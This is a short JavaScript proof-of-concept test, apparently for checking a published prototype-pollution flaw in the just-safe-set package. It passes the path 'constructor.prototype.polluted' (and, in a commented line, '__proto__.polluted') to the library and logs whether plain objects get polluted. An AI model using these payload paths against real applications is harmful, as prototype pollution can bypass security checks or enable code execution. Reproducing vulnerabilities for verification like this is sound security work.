// //https://security.snyk.io/vuln/SNYK-JS-JUSTSAFESET-1316267
// test("prototype pollution in just-safe-set", () => {
  const justSafeSet = require("just-safe-set");
  let obj = {};

console.log({}.polluted);
justSafeSet(obj, "constructor.prototype.polluted", "yes");
  //justSafeSet(obj, "__proto__.polluted", "yes");

console.log({}.polluted);
// });
